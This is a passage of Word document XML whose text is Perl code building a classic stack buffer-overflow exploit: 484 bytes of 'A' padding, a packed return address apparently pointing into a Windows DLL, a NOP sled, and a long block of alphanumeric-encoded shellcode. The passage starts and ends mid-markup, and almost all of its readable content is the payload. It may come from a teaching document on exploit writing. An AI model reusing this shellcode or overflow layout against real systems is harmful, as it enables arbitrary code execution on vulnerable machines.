                              <w:t>$buffer .= "A" x 484;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="581C8E02" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$buffer .= pack('V',0x7C86467B); </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5A80D0F2" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "\x90" x 15;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1ADCB52C" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "\x89\xe0\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>xda</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>\xd0\xd9\x70\xf4\x5d\x55\x59\x49\x49\x49\x49" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="201F29FC" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="669A6995" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4CD16C71" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="193A19CC" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="64FC6C6B" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x38\x4c\x49\x45\x50\x45\x50\x43\x30\x45\x30\x4b\x39\x5a" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="42D81F62" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x45\x50\x31\x58\x52\x45\x34\x4c\x4b\x51\x42\x50\x30\x4c" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7838DC9F" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4b\x50\x52\x54\x4c\x4c\x4b\x50\x52\x54\x54\x4c\x4b\x43" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3874C0CA" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x42\x51\x38\x54\x4f\x4e\x57\x50\x4a\x56\x46\x56\x51\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7214D720" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4f\x50\x31\x4f\x30\x4e\x4c\x47\x4c\x45\x31\x43\x4c\x43" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="248DED59" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x32\x56\x4c\x51\x30\x4f\x31\x58\x4f\x54\x4d\x45\x51\x58" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="73D73995" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x47\x4b\x52\x4c\x30\x50\x52\x50\x57\x4c\x4b\x50\x52\x54" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="22C9098F" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x50\x4c\x4b\x51\x52\x47\x4c\x43\x31\x58\x50\x4c\x4b\x51" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="15807351" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x50\x43\x48\x4d\x55\x4f\x30\x52\x54\x51\x5a\x43\x31\x58" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7BD49F06" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x50\x56\x30\x4c\x4b\x47\x38\x45\x48\x4c\x4b\x51\x48\x51" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="26E596A7" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x30\x45\x51\x49\x43\x5a\x43\x47\x4c\x47\x39\x4c\x4b\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="50D146AE" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x54\x4c\x4b\x45\x51\x58\x56\x50\x31\x4b\x4f\x56\x51\x4f" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="07915C07" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x30\x4e\x4c\x4f\x31\x58\x4f\x54\x4d\x43\x31\x49\x57\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6E8431B6" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x48\x4b\x50\x52\x55\x4c\x34\x54\x43\x43\x4d\x5a\x58\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="607403A8" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4b\x43\x4d\x51\x34\x43\x45\x4d\x32\x50\x58\x4c\x4b\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5DBD3DA3" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x58\x56\x44\x43\x31\x58\x53\x45\x36\x4c\x4b\x54\x4c\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3FF28EDA" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4b\x4c\x4b\x50\x58\x45\x4c\x43\x31\x49\x43\x4c\x4b\x54" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="575F059B" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x44\x4c\x4b\x45\x51\x4e\x30\x4d\x59\x51\x54\x47\x54\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7366DEED" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x44\x51\x4b\x51\x4b\x43\x51\x56\x39\x51\x4a\x56\x31\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4C831F36" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4f\x4b\x50\x50\x58\x51\x4f\x51\x4a\x4c\x4b\x52\x32\x5a" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5D5130DC" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4b\x4d\x56\x51\x4d\x52\x48\x47\x43\x50\x32\x43\x30\x45" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0ECC4463" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x50\x45\x38\x54\x37\x54\x33\x47\x42\x51\x4f\x51\x44\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4D6842FC" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x48\x50\x4c\x52\x57\x51\x36\x43\x37\x4b\x4f\x58\x55\x4f" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="33DEA027" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x48\x4c\x50\x45\x51\x45\x50\x43\x30\x56\x49\x49\x54\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7EB2D381" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x54\x56\x30\x43\x58\x51\x39\x4d\x50\x52\x4b\x45\x50\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2D68E5D0" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4f\x4e\x35\x56\x30\x50\x50\x50\x50\x56\x30\x47\x30\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2C453069" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x50\x51\x50\x56\x30\x52\x48\x4b\x5a\x54\x4f\x49\x4f\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="755EE96F" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x50\x4b\x4f\x58\x55\x4d\x59\x4f\x37\x45\x38\x49\x50\x49" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="552E377E" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x38\x45\x50\x49\x58\x52\x48\x45\x52\x45\x50\x52\x31\x51" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6913B377" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4c\x4d\x59\x4b\x56\x52\x4a\x54\x50\x50\x56\x56\x37\x45" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="33D8BC24" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x38\x4c\x59\x49\x35\x52\x54\x43\x51\x4b\x4f\x58\x55\x45" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1CB677BD" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x38\x43\x53\x52\x4d\x45\x34\x43\x30\x4b\x39\x4d\x33\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1F1C4C27" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x37\x50\x57\x51\x47\x56\x51\x4c\x36\x43\x5a\x52\x32\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1BA23A61" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x39\x51\x46\x4d\x32\x4b\x4d\x43\x56\x4f\x37\x47\x34\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="39A65648" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x44\x47\x4c\x45\x51\x45\x51\x4c\x4d\x51\x54\x56\x44\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3D48E717" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
